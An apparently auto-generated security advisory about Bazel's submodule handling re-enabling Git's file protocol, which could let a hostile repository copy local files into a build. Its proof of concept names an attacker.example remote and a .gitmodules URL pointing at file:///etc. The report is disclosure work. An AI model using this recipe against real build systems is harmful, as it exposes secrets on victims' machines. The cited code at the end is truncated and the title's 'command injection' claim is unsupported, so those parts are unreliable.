### Title
Command/URL scheme injection via re-enabled `file://` submodule protocol in `git_repository` — arbitrary local file disclosure ([File: tools/build_defs/repo/git_worker.bzl])

### Summary
`git_repository`/`new_git_repository`'s submodule handling in `tools/build_defs/repo/git_worker.bzl` explicitly re-enables Git's `file` transport protocol (`-c protocol.file.allow=always`) when running `git submodule update --init [--recursive] --checkout --force`. This deliberately disables a security control that upstream Git added specifically to stop a hostile repository from using `.gitmodules` submodule URLs to make the client read arbitrary files from the local filesystem (the class of bug fixed by Git's `protocol.file.allow=user` default). A hostile origin server whose Git repository Bazel fetches (via a pinned commit/tag/branch in `git_repository`) can embed a `.gitmodules` entry with a `file://` (or absolute local path) submodule URL; because Bazel forces `protocol.file.allow=always`, Git will follow that URL and copy the referenced local path/tree into the checked-out repository during the recursive submodule update, even though the top-level commit itself matched the pin.

### Finding Description
`update_submodules()` in `tools/build_defs/repo/git_worker.bzl` runs: [1](#0-0) 
This unconditionally sets `protocol.file.allow=always` before invoking `git submodule update --init [--recursive] --checkout --force`, with the comment explaining it is done to keep local-directory submodule cloning working (referencing bazelbuild/bazel#17040): [1](#0-0) 

Upstream Git restricts the `file` (and `ext`) transport for submodules by default specifically because a malicious repository can declare a submodule whose URL is a local filesystem path (including paths outside the checkout, e.g. via `../../../etc` or another user's home directory), letting `git submodule update` copy that local content into the victim's checkout — effectively an arbitrary local file/directory read triggered purely by content the remote repository owner controls. Bazel's flag flips this protection back on globally for the submodule-update invocation, for every `git_repository`/`new_git_repository` user who sets `init_submodules`/`recursive_init_submodules = True` (a common, legitimate configuration for consuming third-party Git dependencies with submodules).

The attacker in this analog is the "hostile origin server" that owns/serves the third-party Git repository the victim's `WORKSPACE`/`MODULE.bazel` declares (an unprivileged outsider who publishes content a victim's build consumes) — no MITM or local machine access is required. Pinning `commit` does not stop this: the pinned commit's tree can legitimately (from Git's perspective) contain a `.gitmodules` file with a `file://` or bare local-path submodule URL, and the commit hash pin only verifies that *this exact* `.gitmodules` content is what gets fetched — it does not stop Git from acting on that content once `protocol.file.allow=always` is forced.

### Impact Explanation
When `init_submodules` or `recursive_init_submodules` is set, `git submodule update --init [--recursive] --checkout --force` is run with local-path submodule cloning re-enabled. A malicious `.gitmodules` entry can point at an arbitrary path on the build machine (e.g. `/etc`, a CI secrets directory, `~/.ssh`, or another checked-out repo on the same machine), and its contents get copied into the fetched repository's working tree, i.e. read out of arbitrary filesystem locations into build-visible files. This is a concrete "read outside the repository / exec root" violation: content the victim never intended to expose becomes part of the external repo tree, which downstream build rules can read, embed into build outputs, or exfiltrate (e.g., through a genrule that packages/publishes the checked-out sources).

### Likelihood Explanation
`init_submodules`/`recursive_init_submodules` are ordinary, commonly used attributes of `git_repository`/`new_git_repository` for consuming third-party dependencies that contain submodules. Any dependency source controlled by a third party (the class explicitly covered by this report: "an outsider who publishes ... content a victim's build consumes") can add a crafted `.gitmodules` entry at any point, including as an update to an existing dependency if the victim tracks a branch/tag rather than only ever re-pinning by commit, or simply by being the initial malicious content of a newly adopted dependency. No special privileges, MITM position, or credential access are needed — only the ability to publish/control the Git repository content that Bazel is told to fetch.

### Recommendation
Do not force `protocol.file.allow=always` (or `protocol.ext.allow`) globally for submodule updates. Instead:
- Scope the override narrowly (e.g., only allow `file` protocol for the specific local paths Bazel itself controls, as in bazelbuild/bazel#17040's legitimate local-repository-as-submodule use case), rather than re-enabling it for arbitrary submodule URLs fetched from third-party remotes.
- Alternatively, validate/sanitize discovered submodule URLs before running `submodule update`, rejecting `file://`/local-path submodule URLs that resolve outside the intended checkout directory, mirroring the containment checks already used elsewhere in `git.bzl` (e.g. the `strip_prefix`/`add_prefix` escape checks in `tools/build_defs/repo/git.bzl`).
- At minimum, gate the `protocol.file.allow=always` override behind an explicit, documented opt-in attribute so that projects fetching untrusted third-party Git dependencies with submodules are not silently exposed.

### Proof of Concept
1. Attacker publishes/controls a Git repository `evil.git` and commits a `.gitmodules` file containing a submodule entry with `url = file:///etc` (or a relative `../../` path escaping the checkout) at commit `<pinned_sha>`.
2. Victim's `WORKSPACE`/`MODULE.bazel` declares:
   ```
   git_repository(
       name = "evil_dep",
       remote = "https://attacker.example/evil.git",
       commit = "<pinned_sha>",
       recursive_init_submodules = True,
   )
   ```
3. During fetch, Bazel calls `update_submodules()` in `tools/build_defs/repo/git_worker.bzl`, which executes `git -c protocol.file.allow=always submodule update --init --recursive --checkout --force`.
4. Git follows the `file:///etc` submodule URL (protection normally blocking this is disabled by Bazel's flag) and copies `/etc` contents into the `@evil_dep` repository tree, where they become readable/usable by any target depending on `@evil_dep`.
5. A JUnit/`BuildIntegrationTestCase`-style regression test can assert that fetching a crafted local Git repo containing a `file://`-scheme submodule with `recursive_init_submodules = True` does **not** result in the submodule content being copied from outside the designated fixture directory, failing on the current implementation and passing once the protocol override is removed/scoped.

def update_submodules(ctx, git_repo, recursive = False):
    if recursive:
        # "protocol.file.allow=always" allows the submodule command clone from a local directory.
        # It's necessary for Git 2.38.1 and assoicated backport versions.
        # See https://github.com/bazelbuild/bazel/issues/17040
